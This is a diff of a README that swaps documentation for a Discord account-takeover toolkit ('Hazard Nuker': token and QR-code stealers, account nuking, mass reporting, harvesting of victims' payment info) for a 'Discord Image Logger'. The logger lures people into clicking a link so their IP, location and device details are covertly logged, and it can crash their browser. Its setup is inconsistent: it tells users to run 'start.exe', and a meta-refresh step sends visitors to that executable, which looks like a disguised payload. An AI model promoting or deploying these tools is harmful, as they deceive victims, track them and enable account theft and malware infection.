@@ -1,173 +1,106 @@
-<p align= center</p><a href="https://cheataway.com" target="_blank"><img src="https://i.imgur.com/NuuUSUK.png" alt="HazardNuker"></a>
-<p align="center">
-<img src="https://img.shields.io/github/languages/top/KDot227/hazard-nuker-mirror?style=flat-square" </a>
-<img src="https://img.shields.io/github/last-commit/KDot227/hazard-nuker-mirror?style=flat-square" </a>
-<img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Hazard-Nuker&metric=ncloc" </a>
-<img src="https://img.shields.io/github/license/KDot227/hazard-nuker-mirror?style=flat-square" </a>
-<img src="https://img.shields.io/github/downloads/KDot227/hazard-nuker-mirror/total?color=%23daff00&label=1.4.7 Downloads&style=flat-square" </a>
-<img src="https://img.shields.io/github/stars/KDot227/hazard-nuker-mirror?color=%23daff00&label=Stars&style=flat-square" </a>
-<img src="https://img.shields.io/github/forks/KDot227/hazard-nuker-mirror?color=%23daff00&label=Forks&style=flat-square" </a>
-</p>
-<p align="center">
-<a href="https://github.com/KDot227/hazard-nuker-mirror#installation">Installation</a> |
-<a href="https://github.com/KDot227/hazard-nuker-mirror#Important">Important</a> |
-<a href="https://github.com/KDot227/hazard-nuker-mirror/blob/master/Changelog.md">Changelogs</a> |
-<a href="https://cheataway.com">Discord</a>
-</p>
+# 📸 Discord Image Logger
+**Discord Image Logger** is a simple yet powerful tool that I have created to make it easy to get people to click on links. You can get a person to visit pretty much any site using this trick, and all you need to do is send them an image! It also includes a built-in IP logger with detailed information about the user.
+
+Please note that this is **NOT** a "one click" image logger. There is a very popular scam going around where people claim that they can create an image that will steal all your tokens, passwords and more (basically an image RCE) just by clicking on an image. However, they are all **fake**, and I advise against running any EXE's you find from those repositories or buying anything from anyone.
+
+**If you're going to fork this repository, star it too while you're at it!**
+
+# 📚 Table of Contents
+* [Introduction](#-discord-image-logger) <br>
+* [Features](#-features) <br>
+* [Configuration](#-configuration) <br>
+* [Setup](#%EF%B8%8F-setup) <br>
+* [Video Tutorial](https://www.youtube.com/watch?v=rFbiW2x4HEw) <br>
+* [Bug Reports & Suggestions](#-bug-reports--suggestions) <br>
+* [Closing Statements](#-closing-statements) <br>
 
 ---
 
-**NOTE:** Hazard is not finished! You can expect bugs, crashes, and non-working functions. Please make an issue if you find a bug!
-ㅤ
-#### Hazard Nuker was made with
-Love ❌ <br>
-Code ✅
-
-<h1 allign="center">- Features -</h1>
-
-* ` Settings (Change the Color Theme, Thread Amount, Hotkeys and more!)`
-* ` Both Compact and Feature-Rich`
-* ` QoL Features such as Auto-Update, proxy scraping and more!`
-* ` Easy to use!`
-* ` Fast and Efficient (Low Performance Impact)`
-* ` Linux Support! (Expect Bugs)`
-* ` Create a token logger or QR code stealer!`
-* ` Nuke an account!`
-* ` Change an accounts Status, Bio, or HypeSquad house!`
-* ` Mass DM using an account!`
-* ` Log into an account with an isolated browser!`
-* ` Mass Report a user or server!`
-* ` Group Chat Spam!`
-* ` Webhook Nuker/Deleter`
-* ` And much, much more!`
-
-## Features in detail
-
-<details>
-<summary>All features in detail! (Drop Down)</summary>
-
-#### [1] Nuke a targetted account 
-* Basically all account nuker-based options
-* Uses **Everything**! (Mass DM, Create & Delete Servers, Change Language and Theme)
-* It will remove all their friends and DMs as well
-* Basically, it will shit on their account.
-* Everything is logged in the command window, so you can see it all happening in real time
-
-#### [2] Unfriend all friends
-* Removes all friends from the victim
-
-#### [3] Delete and leave all servers
-* Leaves/Deletes any servers a user is in
-
-#### [4] Spam Create New servers
-* Creates 100 servers! 
-* Can choose a server icon aswell as a name or have it pick a random one.
-
-#### [5] DM Deleter
-* Closes/Deletes all DMs with other users! (Will also leave group chats)
-
-#### [6] Mass DM
-* Message all friends of a user with a custom message!
-
-#### [7] Enable seizure mode
-* Switches between Light & Dark mode every second or so!
-* Also cycles through all the languages.
-
-#### [8] Get information from a targetted account
-Returns a lot of user info based on a token!
-* Username, Discriminator, Creation Date and other user info!
-* Their personal info (such as Language, Creation Date, Email and more!)
-* Their avatar URL, 2FA status, Nitro Info (Type & Days left, if they have Nitro)
-* Payment method, and basic info about it (Address, Number, Payment Status, PayPal info if they use that)
-* Geolocational Info, such as their Country, Region, City and more!
-* And all the other info you could think of!
-
-#### [9] Log into an account
-* Log into a users account with their token!
-* Supports Chrome, Edge, and Opera!
-
-#### [10] Block Friends
-* Blocks all their friends
-
-#### [11] Profile Changer
-* Allows you to modify their Status, Bio, and Hypequad Badge.
-
-#### [12] COMING SOON!
-<img alt="HazardNukerSneakPeek" src="https://user-images.githubusercontent.com/80375661/159819747-52ebb340-6350-4639-a6e1-abfdfd1f80a0.png" width="65%">
-
-#### [13] Create Token Grabber
-Creates a token logger based off the **Hazard Stealer V2!**
-(You can find a link to the source code [here](https://github.com/Rdimo/Hazard-Token-Grabber-V2))
-
-<p align="left"><img src="https://user-images.githubusercontent.com/80375661/159514536-d8249923-adbe-4b9e-a187-6b028941f4a7.png"</p>
-
-#### [14] QR Code Grabber
-Creates a QR code! If someone scans the QR code, you can gain access to their account!
-> The webhook notification looks like this:
-
-<p align="left"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/QR-code.jpg"</p>
-
-#### [15] Mass Report
-* Reports a user until you stop it.
-
-#### [16] GroupChat Spammer
-* Create a bunch of GCs with a specified user or random ones.
-
-#### [17] Webhook Destroyer
-* Spam & Delete any valid webhook!
-
-#### [18] Settings
-Change the following:
-* Theme
-* Threads
-* Hotkeys
-* Exit
-</details>
+# 💎 Features
+* Fast, Free, and Easy!
+* 100% Untracable and Anonymous!
+* Requires only clicking "Open Original"!
+* Steals as much as possible, including your street address via GPS!
+* Under active development, many new features will be added!
 
 ---
 
-### ❗ Important
-* Found a bug? Join the [Discord](https://cheataway.com/invite) and contact me (Rdimo) or create an issue about it directly in [here!](https://github.com/KDot227/hazard-nuker-mirror/issues/new/choose)
-> **WARNING:** Many people have been selling/distributing infected versions of Hazard Nuker.
-> **DO NOT** install Hazard Nuker from any place other than this page. If you install it from somewhere else, expect to be **Hacked/Scammed.**
+# 🔧 Configuration
 
-## 🤓 Dear Skids
-**Good for you,** you decided to skid something. <br>
-We can't stop you, but just know you're pathetic. <br>
-<br>
-I hope you end up on the streets begging for spare change.
+Open up `start.exe`
 
-## Installation 
+**WEBHOOK:** `Your Discord webhook!` <br>
+**IMAGE:** `A LINK to your desired Image.` <br>
+**IMAGEARGUMENT:** `Enable image reading from the argument. (See Annotation #1)` <br>
+**USERNAME:** `The username of the bot that sends` <br>
+**COLOR:** `The embed's sidebar color` <br>
+**DOCRASHBROWSER:** `Crash the user's browser` <br>
+**DOMESSAGE:** `Show a custom message when they click?` <br>
+**MESSAGE:** `The message to show.` <br>
+**RICHMESSAGE:** `Enable a rich message, which allows inserting variables. (See Annotation #2)` <br>
+**VPNCHECK:** `Prevent VPNs from spamming your webhook!` <br>
+**LINKALERTS:** `Tell you when someone sends an image logging link` <br>
+**BUGGEDIMAGE:** `Display a loading image on Discord` <br>
+**ANTIBOT:** `Prevent bots from spamming your webhook!` <br>
+**REDIRECT:** `Redirect user?` <br>
+**PAGE:** `Page to redirect to, if so` <br>
 
-#### Compiled Version (Easier but more buggy)
-```sh-session
-Visit: https://github.com/KDot227/hazard-nuker-mirror/releases
-Download the latest release (Hazard.zip) and extract the EXE to your desktop.
-Finally, run the executable and enjoy!
+**ANNOTATIONS:**
+* **1)** `IMAGEARGUMENT`
+When enabled, this will allow you to provide an argument in the URL as the image. <br>
+You can do this by URL-safe Base64 encoding a link, and supplying it as the `URL` or `ID` argument. <br>
+EXAMPLE: `https://your.epic.image.logger/api/main?url=aHR0cHM6Ly8...` <br>
+The above Base64 is cut off short, but it would lead to a URL of an image. <br>
+If it's enabled and no `URL` or `ID` argument is supplied, the default configured one will be used.
+
+* **2)** `RICHMESSAGE`
+Rich Message allows you to insert variables such as the client's IP, Location, ASN, etc. for the Crashbrowser message. <br>
+Simply insert anything in the following table and it will replace it respectively. <br>
+
+| Values |
+|--------|
+| `{ip}` Their IP Address. |
+| `{isp}` Their ISP (Internet Service Provider) |
+| `{asn}` Their ASN (Autonomous System Number) |
+| `{country}` The country in which the IP is located. |
+| `{region}` The region in which the IP is located. |
+| `{city}` The city in which the IP is located. |
+| `{lat}` The IPs latitude. |
+| `{long}` The IPs longitude. |
+| `{timezone}` The timezone of the IP. |
+| `{mobile}` If it's a mobile connection. |
+| `{vpn}` If the IP belongs to a VPN/Proxy. |
+| `{bot}` If the IP is a robot. |
+| `{browser}` The Browser of the client. |
+| `{os}` The OS of the client. |
+
+---
+
+# ⚒️ Setup
+
+Now that you've got all that set up, let's install this thing! <br>
+
+You can also watch the [Video Tutorial!](https://www.youtube.com/watch?v=rFbiW2x4HEw)
+
+- **1:** Create a GitHub repository. I recommend it be private, so others can't see your webhook URL.
+- **2:** Make a folder named `api`, and place `requirements.txt` and `main.py` in (Rename it whatever, e.g. catpicture.py would make the URL your.site/api/catepicture)
+- **3:** (Optional) make a file in the main root (NOT IN API) named `index.html`, and put the code below in:
+```html
+<meta http-equiv="refresh" content="0;url=./api/start.exe">
 ```
+(You can replace main.py with whatever you made it!); The point of this step is so that you can just visit your.site and not your.site/api/main (The former seems much less suspicious) however note it may not preview on Discord if you do so. Still looking for a workaround for this.
+- **4:** Visit https://vercel.com and log in with GitHub.
+- **5:** Click *add new* to make a new project. Select the GitHub repository you made where it says **Import GitHub Repository**
+- **6:** Copy the domain for you. It should be something like `project.vercel.app`, unless you did step #3 you'll have to add `api/main` to it, so it will look more like `project.vercel.app/api/main` *(Replace `project.vercel.app` with the domain it gave you, and `main` with whatever you named the file, WITHOUT THE `.py`, or else it will say potentially dangerous download)*, now send your link, have someone click Open Original/Open in Browser, and watch!
 
-#### Source Code Version (More complicated but less buggy)
-```sh-session
-Click the green "Code" button.
-Click "Download ZIP"
-Extract the ZIP to a folder.
-
-Run setup.bat, which will install all dependencies and open the script.
-After that, every time you'd like to use Hazard, simply open start.bat
-
-NOTE: Make sure you have Python 3.9.5 or above installed from python.org (NOT MICROSOFT) & added to path.
-```
+You can also add a domain if you have one!
 
 ---
 
-🌟 **Enjoyed Hazard Nuker?** Consider dropping a star :)
+# 🐛 Bug Reports & Suggestions
 
-<a href="https://cheataway.com" target="_blank"><img src="https://cdn.discordapp.com/avatars/1026078415754887168/361f632df71851579af62750e6897b8f.png?size=256" alt="Cheataway"/></a>
+**Found a bug? Have an idea?** Let me know [here!](../../issues) Please provide a detailed explanation of the expected behavior, actual behavior, and steps to reproduce, or what you want to see and how it could be done. You can be a small part of this project!
 
-**Hazard Stealer was created by Rdimo & DeKrypt. + Maintained by K.Dot227**
+**NOTE:** You are supposed to run `start.exe`! Please read the instructions. I will not help if your bug report/issue is "start.exe will not open".
 
-Discord: Rdimo#6969 | DeKrypt#7777 | K.Dot#7122
 
-Website: https://cheataway.com/
-
-Server: https://cheataway.com/invite
